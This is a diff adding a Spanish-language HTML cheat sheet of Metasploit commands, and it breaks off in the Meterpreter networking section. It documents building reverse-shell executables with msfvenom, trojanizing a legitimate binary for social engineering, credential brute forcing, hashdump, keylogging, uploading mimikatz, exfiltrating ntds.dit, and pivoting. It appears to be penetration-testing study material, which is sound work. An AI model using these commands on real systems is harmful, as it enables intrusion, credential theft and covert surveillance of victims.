@@ -1,0 +1,396 @@
+<!--
+  HOJA DE REFERENCIA: Comandos Metasploit Framework
+  ================================================
+  Este documento es una cheat sheet interactiva con pestañas y búsqueda.
+-->
+
+<link rel="stylesheet" href="../styles.css" />
+
+<!-- TÍTULO VISIBLE CENTRADO -->
+<h1 class="main-title">Comandos Metasploit</h1>
+
+<!-- TÍTULO ACCESIBLE (solo para lectores de pantalla) -->
+<h2 class="sr-only">Referencia interactiva de comandos Metasploit Framework</h2>
+
+<!--  CONTENEDOR PRINCIPAL-->
+<div class="main-container">
+  <!-- BOTÓN VOLVER AL INICIO -->
+  <div style="margin-bottom: 1rem;">
+    <a href="../index.html"
+      style="display: inline-flex; align-items: center; gap: 6px; color: var(--color-text-secondary); text-decoration: none; font-size: 14px; padding: 6px 12px; border-radius: var(--border-radius-md); border: 0.5px solid var(--color-border-secondary); background: transparent; cursor: pointer; transition: all 0.15s;">
+      ← Volver al inicio
+    </a>
+  </div>
+
+  <!-- PESTAÑAS PRINCIPALES -->
+  <div class="tabs-main">
+    <button class="tab-main active" onclick="showMainTab('basic')">Básico</button>
+    <button class="tab-main" onclick="showMainTab('exploits')">Exploits</button>
+    <button class="tab-main" onclick="showMainTab('payloads')">Payloads</button>
+    <button class="tab-main" onclick="showMainTab('meterpreter')">Meterpreter</button>
+    <button class="tab-main" onclick="showMainTab('advanced')">Avanzado</button>
+  </div>
+
+  <!-- PESTAÑAS SECUNDARIAS: Básico -->
+  <div id="subtabs-basic" class="subtabs">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('basic-start')">Inicio/Consola</button>
+      <button class="subtab" onclick="showSubTab('basic-search')">Búsqueda</button>
+      <button class="subtab" onclick="showSubTab('basic-workspace')">Workspaces</button>
+    </div>
+  </div>
+
+  <!-- PESTAÑAS SECUNDARIAS: Exploits -->
+  <div id="subtabs-exploits" class="subtabs" style="display: none;">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('exp-select')">Selección</button>
+      <button class="subtab" onclick="showSubTab('exp-options')">Opciones</button>
+      <button class="subtab" onclick="showSubTab('exp-auxiliary')">Auxiliares</button>
+    </div>
+  </div>
+
+  <!-- PESTAÑAS SECUNDARIAS: Payloads -->
+  <div id="subtabs-payloads" class="subtabs" style="display: none;">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('pay-types')">Tipos</button>
+      <button class="subtab" onclick="showSubTab('pay-generate')">msfvenom</button>
+      <button class="subtab" onclick="showSubTab('pay-staged')">Staged vs Stageless</button>
+    </div>
+  </div>
+
+  <!-- PESTAÑAS SECUNDARIAS: Meterpreter -->
+  <div id="subtabs-meterpreter" class="subtabs" style="display: none;">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('met-basic')">Comandos básicos</button>
+      <button class="subtab" onclick="showSubTab('met-files')">Archivos</button>
+      <button class="subtab" onclick="showSubTab('met-system')">Sistema</button>
+      <button class="subtab" onclick="showSubTab('met-network')">Red</button>
+    </div>
+  </div>
+
+  <!-- PESTAÑAS SECUNDARIAS: Avanzado -->
+  <div id="subtabs-advanced" class="subtabs" style="display: none;">
+    <div class="inner">
+      <button class="subtab active" onclick="showSubTab('adv-db')">Base de datos</button>
+      <button class="subtab" onclick="showSubTab('adv-evasion')">Evasión</button>
+      <button class="subtab" onclick="showSubTab('adv-post')">Post-explotación</button>
+    </div>
+  </div>
+
+  <!-- CAJA DE BÚSQUEDA -->
+  <input class="search-box" type="text" placeholder="Buscar comando o parámetro..." oninput="filterCmds(this.value)"
+    id="searchInput" />
+
+  <div id="allCmds">
+    <!-- #################### BÁSICO #################### -->
+    <!-- BÁSICO - INICIO/CONSOLA -->
+    <div class="section active" id="tab-basic-start" data-group="basic-start">
+      <div class="cmd-group">
+        <div class="group-title">Inicio y consola (msfconsole)</div>
+        <div class="cmd-row"><span class="cmd-name">msfconsole</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Inicia la interfaz principal de Metasploit. El CLI interactivo donde se ejecutan todos los módulos.<br><span class="param">-q</span> sin banner · <span class="param">-x "cmd; cmd"</span> ejecuta comandos al inicio</span></div>
+        <div class="cmd-row"><span class="cmd-name">msfconsole -r &lt;archivo.rc&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Ejecuta un resource script (.rc) automáticamente al iniciar. Útil para automatizar flujos de trabajo repetitivos.<br><span class="param">-r setup.rc</span> carga y ejecuta el script</span></div>
+        <div class="cmd-row"><span class="cmd-name">msfdb init</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Inicializa la base de datos PostgreSQL de Metasploit. Necesario para guardar hosts, servicios, vulnerabilidades y sesiones entre sesiones.<br><span class="param">msfdb status</span> verifica estado · <span class="param">msfdb reinit</span> reinicia</span></div>
+        <div class="cmd-row"><span class="cmd-name">db_status</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Verifica si la conexión a la base de datos está activa dentro de msfconsole. Sin DB no se guardan los resultados de escaneos ni hosts.<br><span class="param">[*]</span> conectado · <span class="param">[-]</span> desconectado</span></div>
+        <div class="cmd-row"><span class="cmd-name">help / ?</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra todos los comandos disponibles en msfconsole agrupados por categoría: Core, Database, Jobs, Modules, Sessions.<br><span class="param">help &lt;comando&gt;</span> ayuda específica de un comando</span></div>
+        <div class="cmd-row"><span class="cmd-name">exit / quit</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Cierra msfconsole. Las sesiones de Meterpreter activas se mantienen en segundo plano si no se matan antes.<br><span class="param">exit -y</span> confirma · <span class="param">quit</span> alias</span></div>
+      </div>
+    </div>
+
+    <!-- BÁSICO - BÚSQUEDA -->
+    <div class="section" id="tab-basic-search" data-group="basic-search">
+      <div class="cmd-group">
+        <div class="group-title">Búsqueda de módulos (msfconsole)</div>
+        <div class="cmd-row"><span class="cmd-name">search &lt;término&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Busca módulos por nombre, descripción, CVE, plataforma o tipo. Devuelve nombre, disclosure date, rank y nombre completo.<br><span class="param">search eternalblue</span> · <span class="param">search cve:2021</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">search type:exploit platform:windows</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Filtra búsqueda por tipo de módulo y plataforma. Combinable con port:, rank:, date:, author:. Ideal para encontrar exploits específicos.<br><span class="param">rank:great</span> · <span class="param">port:445</span> · <span class="param">date:2020-2024</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">search type:auxiliary</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Busca módulos auxiliares (escaneo, fuzzing, sniffing, admin). No explotan, pero sirven para reconocimiento y enumeración.<br><span class="param">type:exploit</span> · <span class="param">type:payload</span> · <span class="param">type:post</span> · <span class="param">type:encoder</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">search name:smb</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Busca módulos cuyo nombre contenga "smb". Útil cuando sabes el protocolo pero no el exploit exacto.<br><span class="param">name:ssh</span> · <span class="param">name:http</span> · <span class="param">name:mysql</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">info &lt;módulo&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra detalles completos de un módulo: descripción, autores, referencias, opciones requeridas, payloads compatibles y targets soportados.<br><span class="param">info exploit/windows/smb/ms17_010_eternalblue</span></span></div>
+      </div>
+    </div>
+
+    <!-- BÁSICO - WORKSPACES -->
+    <div class="section" id="tab-basic-workspace" data-group="basic-workspace">
+      <div class="cmd-group">
+        <div class="group-title">Gestión de workspaces (msfconsole)</div>
+        <div class="cmd-row"><span class="cmd-name">workspace</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista todos los workspaces disponibles y marca el activo con un asterisco. Los workspaces separan proyectos/engagements en la base de datos.<br><span class="param">*</span> indica workspace actual</span></div>
+        <div class="cmd-row"><span class="cmd-name">workspace -a &lt;nombre&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Crea un nuevo workspace y cambia a él automáticamente. Todo lo que se escanee o exploite se guarda en ese workspace.<br><span class="param">workspace -a cliente_a</span> crea y activa</span></div>
+        <div class="cmd-row"><span class="cmd-name">workspace &lt;nombre&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Cambia al workspace especificado. Los datos del workspace anterior permanecen intactos y accesibles al volver.<br><span class="param">workspace default</span> vuelve al workspace por defecto</span></div>
+        <div class="cmd-row"><span class="cmd-name">workspace -d &lt;nombre&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Elimina un workspace y todos sus datos de la base de datos (hosts, servicios, vulns, notas). Irreversible.<br><span class="param">workspace -D</span> elimina TODOS los workspaces</span></div>
+        <div class="cmd-row"><span class="cmd-name">workspace -r &lt;viejo&gt; &lt;nuevo&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Renombra un workspace existente. Útil para corregir nombres o estandarizar nomenclatura entre engagements.<br><span class="param">workspace -r temp production</span></span></div>
+      </div>
+    </div>
+
+    <!-- #################### EXPLOITS #################### -->
+    <!-- EXPLOITS - SELECCIÓN -->
+    <div class="section" id="tab-exp-select" data-group="exp-select">
+      <div class="cmd-group">
+        <div class="group-title">Selección de exploits (msfconsole)</div>
+        <div class="cmd-row"><span class="cmd-name">use &lt;módulo&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Carga un módulo en la consola activa. Cambia el prompt a msf6(exploit/ruta) o msf6( auxiliary/ruta). A partir de aquí se configuran opciones.<br><span class="param">use exploit/windows/smb/ms17_010_eternalblue</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">use &lt;número&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Carga un módulo por su número de índice (del resultado de search). Más rápido que escribir la ruta completa.<br><span class="param">search eternalblue</span> → <span class="param">use 0</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">back</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Sale del módulo actual y vuelve al prompt principal msf6(). No cierra sesiones ni jobs activos. Útil para cambiar de módulo rápidamente.<br><span class="param">back</span> vuelve al inicio</span></div>
+        <div class="cmd-row"><span class="cmd-name">show targets</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista los sistemas operativos y versiones compatibles con el exploit cargado. Cada target tiene un ID numérico para seleccionar con set TARGET.<br><span class="param">set TARGET 0</span> selecciona por ID</span></div>
+        <div class="cmd-row"><span class="cmd-name">run / exploit</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Ejecuta el exploit con las opciones configuradas. "run" funciona en todos los módulos, "exploit" solo en tipo exploit. Abre sesión si tiene éxito.<br><span class="param">exploit -j</span> ejecuta como job en background</span></div>
+        <div class="cmd-row"><span class="cmd-name">recheck</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Re-verifica si el target es vulnerable sin ejecutar el exploit completo. Útil después de cambiar opciones o cuando el primer check dio falso negativo.<br><span class="param">check</span> verifica vulnerabilidad</span></div>
+      </div>
+    </div>
+
+    <!-- EXPLOITS - OPCIONES -->
+    <div class="section" id="tab-exp-options" data-group="exp-options">
+      <div class="cmd-group">
+        <div class="group-title">Configuración de opciones (msfconsole)</div>
+        <div class="cmd-row"><span class="cmd-name">show options</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra todas las opciones configurables del módulo activo: nombre, valor actual, requerido y descripción. Las marcadas como "yes" en Required deben configurarse.<br><span class="param">Current Setting</span> valor actual · <span class="param">Required</span> obligatorio</span></div>
+        <div class="cmd-row"><span class="cmd-name">set &lt;OPCIÓN&gt; &lt;valor&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Configura una opción del módulo activo. Persiste solo para la sesión actual del módulo. Opciones comunes: RHOSTS, RPORT, LHOST, LPORT, PAYLOAD.<br><span class="param">set RHOSTS 192.168.1.100</span> · <span class="param">set LPORT 4444</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">setg &lt;OPCIÓN&gt; &lt;valor&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Configura una opción global que se aplica a TODOS los módulos. Ideal para LHOST, Proxies, UserAgent que se usan repetidamente.<br><span class="param">setg LHOST 192.168.1.50</span> · <span class="param">setg Proxies socks5:127.0.0.1:9050</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">unset &lt;OPCIÓN&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Elimina el valor de una opción específica del módulo activo. Vuelve al valor por defecto o a vacío.<br><span class="param">unset RHOSTS</span> limpia el target</span></div>
+        <div class="cmd-row"><span class="cmd-name">unsetg &lt;OPCIÓN&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Elimina una opción global. Necesario si setg configuró algo que interfiere con un módulo específico.<br><span class="param">unsetg Proxies</span> quita proxy global</span></div>
+        <div class="cmd-row"><span class="cmd-name">set PAYLOAD &lt;payload&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Selecciona el payload que se ejecutará tras la explotación exitosa. Debe ser compatible con el exploit y el target.<br><span class="param">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span></span></div>
+      </div>
+    </div>
+
+    <!-- EXPLOITS - AUXILIARES -->
+    <div class="section" id="tab-exp-auxiliary" data-group="exp-auxiliary">
+      <div class="cmd-group">
+        <div class="group-title">Módulos auxiliares (msfconsole)</div>
+        <div class="cmd-row"><span class="cmd-name">use auxiliary/scanner/portscan/tcp</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Escáner de puertos TCP integrado en Metasploit. Más lento que nmap pero los resultados se guardan automáticamente en la base de datos.<br><span class="param">set RHOSTS 192.168.1.0/24</span> · <span class="param">set PORTS 1-1000</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">use auxiliary/scanner/http/dir_scanner</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Fuerza bruta de directorios web usando una wordlist integrada. Encuentra paths ocultos, paneles admin, backups.<br><span class="param">set RHOSTS target</span> · <span class="param">set THREADS 10</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">use auxiliary/scanner/smb/smb_login</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Fuerza bruta de credenciales SMB. Prueba combinaciones user:pass contra el target. Útil para encontrar cuentas débiles en redes Windows.<br><span class="param">set USER_FILE users.txt</span> · <span class="param">set PASS_FILE pass.txt</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">use auxiliary/scanner/ssh/ssh_login</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Fuerza bruta de credenciales SSH. Si encuentra credenciales válidas, abre una sesión de shell automáticamente.<br><span class="param">set RHOSTS target</span> · <span class="param">set STOP_ON_SUCCESS true</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">use auxiliary/scanner/snmp/snmp_login</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Fuerza bruta de comunidades SNMP. Muchos dispositivos usan "public" o "private" como comunidad por defecto.<br><span class="param">set RHOSTS target</span> · <span class="param">set THREADS 20</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">use auxiliary/gather/*</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Categoría de módulos de recolección de información: enumeración de usuarios, extracción de hashes, fingerprinting de servicios.<br><span class="param">search type:auxiliary category:gather</span></span></div>
+      </div>
+    </div>
+
+    <!-- #################### PAYLOADS #################### -->
+    <!-- PAYLOADS - TIPOS -->
+    <div class="section" id="tab-pay-types" data-group="pay-types">
+      <div class="cmd-group">
+        <div class="group-title">Tipos de payloads (msfconsole)</div>
+        <div class="cmd-row"><span class="cmd-name">show payloads</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista todos los payloads compatibles con el exploit actualmente cargado. Filtra automáticamente por plataforma y arquitectura.<br><span class="param">show payloads</span> solo los compatibles con el exploit activo</span></div>
+        <div class="cmd-row"><span class="cmd-name">reverse_tcp</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> El payload se conecta de vuelta al atacante (reverse shell). Requiere que el target pueda alcanzar tu IP:puerto. Funciona detrás de NAT si configuras port forwarding.<br><span class="param">LHOST</span> tu IP · <span class="param">LPORT</span> puerto de escucha</span></div>
+        <div class="cmd-row"><span class="cmd-name">bind_tcp</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> El payload abre un puerto en el target y el atacante se conecta. No funciona si hay firewall en el target bloqueando puertos entrantes.<br><span class="param">RHOST</span> IP del target · <span class="param">RPORT</span> puerto que abre el payload</span></div>
+        <div class="cmd-row"><span class="cmd-name">meterpreter</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Payload avanzado de Metasploit. Proporciona shell interactivo con comandos propios: upload/download, keylogger, screenshot, pivoting, migrate. No escribe en disco (in-memory).<br><span class="param">meterpreter/reverse_tcp</span> · <span class="param">meterpreter/reverse_https</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">shell</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Payload básico que devuelve una shell del sistema (cmd.exe en Windows, /bin/sh en Linux). Menos funcional que Meterpreter pero más ligero y difícil de detectar.<br><span class="param">shell/reverse_tcp</span> · <span class="param">shell/bind_tcp</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">windows/x64/meterpreter/reverse_https</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Meterpreter sobre HTTPS. El tráfico se camufla como HTTPS normal, evadiendo IDS/IPS que inspeccionan puertos. Requiere LHOST y LPORT (443 recomendado).<br><span class="param">set LPORT 443</span> · tráfico cifrado TLS</span></div>
+      </div>
+    </div>
+
+    <!-- PAYLOADS - MSFVENOM -->
+    <div class="section" id="tab-pay-generate" data-group="pay-generate">
+      <div class="cmd-group">
+        <div class="group-title">Generación de payloads (msfvenom)</div>
+        <div class="cmd-row"><span class="cmd-name">msfvenom -p &lt;payload&gt; -f &lt;formato&gt; -o &lt;archivo&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Genera un payload standalone en el formato especificado. Se ejecuta fuera de msfconsole, pero la sesión se recibe en msfconsole con handler.<br><span class="param">-p windows/x64/meterpreter/reverse_tcp</span> · <span class="param">-f exe</span> · <span class="param">-o payload.exe</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">msfvenom -p ... LHOST=x LPORT=x -f exe -o payload.exe</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Genera un ejecutable Windows con Meterpreter reverse TCP. El target ejecuta el .exe y se conecta de vuelta al atacante.<br><span class="param">LHOST=192.168.1.50</span> tu IP · <span class="param">LPORT=4444</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">msfvenom -p ... -e x86/shikata_ga_nai -i 5</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Aplica encoding para ofuscar el payload. Shikata Ga Nai es un encoder polimórfico que cambia la firma en cada iteración. No evade AV moderno por sí solo.<br><span class="param">-i 5</span> 5 iteraciones de encoding</span></div>
+        <div class="cmd-row"><span class="cmd-name">msfvenom -l formats</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista todos los formatos de output disponibles: exe, elf, asp, aspx, jsp, war, py, c, raw, dll, msi, vba, etc.<br><span class="param">-f raw</span> sin formato · <span class="param">-f c</span> array C · <span class="param">-f python</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">msfvenom -l payloads</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista TODOS los payloads disponibles en Metasploit. Filtrable con grep: msfvenom -l payloads | grep windows | grep x64<br><span class="param">| grep linux</span> · <span class="param">| grep meterpreter</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">msfvenom -p ... -x template.exe -k -f exe -o payload.exe</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Inyecta el payload en un ejecutable legítimo (template.exe). El -k mantiene la funcionalidad original del binario. Útil para ingeniería social.<br><span class="param">-x putty.exe</span> binario legítimo · <span class="param">-k</span> mantener funcionalidad</span></div>
+      </div>
+    </div>
+
+    <!-- PAYLOADS - STAGED VS STAGELESS -->
+    <div class="section" id="tab-pay-staged" data-group="pay-staged">
+      <div class="cmd-group">
+        <div class="group-title">Staged vs Stageless payloads</div>
+        <div class="cmd-row"><span class="cmd-name">reverse_tcp (staged)</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Envía primero un stager mínimo (~300 bytes) que descarga el payload completo (Meterpreter) desde el atacante. Más pequeño pero requiere conexión estable para la segunda etapa.<br><span class="param">windows/x64/meterpreter/reverse_tcp</span> · slash = staged</span></div>
+        <div class="cmd-row"><span class="cmd-name">reverse_tcp (stageless)</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> El payload completo va incluido en un solo binario. No necesita descargar nada extra. Más grande pero más confiable en redes inestables.<br><span class="param">windows/x64/meterpreter_reverse_tcp</span> · underscore = stageless</span></div>
+        <div class="cmd-row"><span class="cmd-name">multi/handler</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Módulo genérico para recibir conexiones de payloads generados con msfvenom. Configura el mismo payload, LHOST y LPORT que usaste en msfvenom y ejecuta.<br><span class="param">use exploit/multi/handler</span> · <span class="param">set PAYLOAD ...</span> · <span class="param">run -j</span></span></div>
+      </div>
+    </div>
+
+    <!-- #################### METERPRETER #################### -->
+    <!-- METERPRETER - BÁSICO -->
+    <div class="section" id="tab-met-basic" data-group="met-basic">
+      <div class="cmd-group">
+        <div class="group-title">Comandos básicos de Meterpreter</div>
+        <div class="cmd-row"><span class="cmd-name">help</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra todos los comandos disponibles en la sesión de Meterpreter agrupados por categoría: File system, Networking, System, User interface, etc.<br><span class="param">help &lt;comando&gt;</span> ayuda específica</span></div>
+        <div class="cmd-row"><span class="cmd-name">sysinfo</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra información del sistema comprometido: nombre de máquina, OS, arquitectura, dominio y usuario actual. Primer comando a ejecutar tras obtener sesión.<br><span class="param">Computer</span> hostname · <span class="param">OS</span> versión · <span class="param">Architecture</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">getuid</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra el usuario bajo el cual corre la sesión de Meterpreter. Determina qué privilegios tienes y si necesitas escalar.<br><span class="param">Server username</span> usuario actual · <span class="param">NT AUTHORITY\SYSTEM</span> máximo privilegio</span></div>
+        <div class="cmd-row"><span class="cmd-name">getsystem</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Intenta escalar privilegios a SYSTEM (Windows) o root (Linux). Usa múltiples técnicas automáticamente: token impersonation, named pipe, service exploits.<br><span class="param">getsystem -t 1</span> técnica específica · <span class="param">getsystem -v</span> verbose</span></div>
+        <div class="cmd-row"><span class="cmd-name">background / bg</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Envía la sesión de Meterpreter a segundo plano sin cerrarla. Vuelves al prompt de msfconsole. La sesión sigue activa y se puede recuperar con sessions -i.<br><span class="param">background</span> envía a bg · <span class="param">sessions -i 1</span> recupera sesión 1</span></div>
+        <div class="cmd-row"><span class="cmd-name">shell</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Abre una shell interactiva del sistema operativo (cmd.exe en Windows, /bin/sh en Linux) dentro de la sesión de Meterpreter. Para volver a Meterpreter: exit.<br><span class="param">shell</span> abre shell · <span class="param">exit</span> vuelve a meterpreter</span></div>
+      </div>
+    </div>
+
+    <!-- METERPRETER - ARCHIVOS -->
+    <div class="section" id="tab-met-files" data-group="met-files">
+      <div class="cmd-group">
+        <div class="group-title">Gestión de archivos (Meterpreter)</div>
+        <div class="cmd-row"><span class="cmd-name">ls / pwd / cd</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Navegación básica del sistema de archivos del target. ls muestra archivos y permisos, pwd directorio actual, cd cambia de directorio.<br><span class="param">ls -la</span> detalles · <span class="param">cd C:\Users</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">upload &lt;local&gt; &lt;remoto&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Sube un archivo desde tu máquina al target. Útil para subir herramientas, exploits adicionales, wordlists o binarios de escalada.<br><span class="param">upload /tmp/mimikatz.exe C:\Windows\Temp\</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">download &lt;remoto&gt; &lt;local&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Descarga archivos del target a tu máquina. Ideal para extraer bases de datos, documentos sensibles, hashes o archivos de configuración.<br><span class="param">download C:\Windows\NTDS\ntds.dit /tmp/</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">search -f &lt;patrón&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Busca archivos en el target por nombre o patrón. Recursivo por defecto. Útil para encontrar archivos sensibles: passwords, configs, backups.<br><span class="param">search -f *.txt</span> · <span class="param">search -f password*</span> · <span class="param">-d C:\</span> directorio</span></div>
+        <div class="cmd-row"><span class="cmd-name">cat &lt;archivo&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra el contenido de un archivo remoto sin descargarlo. Útil para leer configs, logs, archivos de texto rápidamente.<br><span class="param">cat C:\Windows\System32\drivers\etc\hosts</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">rm / mkdir / edit</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Eliminar archivos, crear directorios y editar archivos remotos. edit abre un editor interactivo en el archivo especificado.<br><span class="param">rm archivo.txt</span> · <span class="param">mkdir backup</span> · <span class="param">edit config.ini</span></span></div>
+      </div>
+    </div>
+
+    <!-- METERPRETER - SISTEMA -->
+    <div class="section" id="tab-met-system" data-group="met-system">
+      <div class="cmd-group">
+        <div class="group-title">Comandos de sistema (Meterpreter)</div>
+        <div class="cmd-row"><span class="cmd-name">ps</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Lista todos los procesos en ejecución del target con PID, nombre, arquitectura, sesión y usuario. Necesario para identificar procesos donde migrarse.<br><span class="param">PID</span> identificador · <span class="param">Arch</span> x86/x64 · <span class="param">User</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">migrate &lt;PID&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Mueve la sesión de Meterpreter a otro proceso. Útil para persistencia (migrarse a un servicio) o estabilidad (migrarse a un proceso que no se cierra).<br><span class="param">migrate 1234</span> migra al PID 1234 · <span class="param">getpid</span> tu PID actual</span></div>
+        <div class="cmd-row"><span class="cmd-name">hashdump</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Extrae los hashes NTLM de la SAM database de Windows. Requiere privilegios SYSTEM. Los hashes se pueden usar en ataques pass-the-hash o crackear con John/Hashcat.<br><span class="param">Administrator:500:aad3b435b51404ee:...</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">keyscan_start / keyscan_dump</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Inicia un keylogger en el target y vuelca las teclas capturadas. keyscan_stop detiene la captura. Requiere interacción del usuario.<br><span class="param">keyscan_start</span> inicia · <span class="param">keyscan_dump</span> muestra teclas · <span class="param">keyscan_stop</span></span></div>
+        <div class="cmd-row"><span class="cmd-name">screenshot</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Captura una imagen de la pantalla del target. Útil para ver qué está haciendo el usuario, capturar sesiones abiertas o interfaces web.<br><span class="param">screenshot</span> guarda como .jpeg · <span class="param">-v true</span> verbose</span></div>
+        <div class="cmd-row"><span class="cmd-name">run post/windows/manage/migrate</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Módulo post que migra automáticamente a un proceso estable (explorer.exe, svchost.exe). Más inteligente que migrate manual porque elige el mejor proceso.<br><span class="param">run post/...</span> ejecuta módulo post</span></div>
+      </div>
+    </div>
+
+    <!-- METERPRETER - RED -->
+    <div class="section" id="tab-met-network" data-group="met-network">
+      <div class="cmd-group">
+        <div class="group-title">Comandos de red (Meterpreter)</div>
+        <div class="cmd-row"><span class="cmd-name">ipconfig / ifconfig</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Muestra las interfaces de red del target: IPs, máscaras de subred, gateways. Esencial para identificar redes internas y planear pivoting.<br><span class="param">ipconfig</span> Windows · <span class="param">ifconfig</span> Linux</span></div>
+        <div class="cmd-row"><span class="cmd-name">portfwd add -l &lt;local&gt; -p &lt;remoto&gt; -r &lt;target&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Redirige un puerto del target a tu máquina local. Accede a servicios internos del target que no son accesibles desde fuera.<br><span class="param">portfwd add -l 3389 -p 3389 -r 192.168.1.100</span> RDP</span></div>
+        <div class="cmd-row"><span class="cmd-name">route add &lt;subred&gt; &lt;máscara&gt; &lt;sesión&gt;</span><span class="cmd-desc"><span class="cmd-purpose">Para qué sirve:</span> Añade una ruta a través de la sesión de Meterpreter. Permite que Metasploit alcance redes internas del target (pivoting).<br><span class="param">route add 192.168.2.0 255.255.255.0 1</span> sesión 1</span></div>
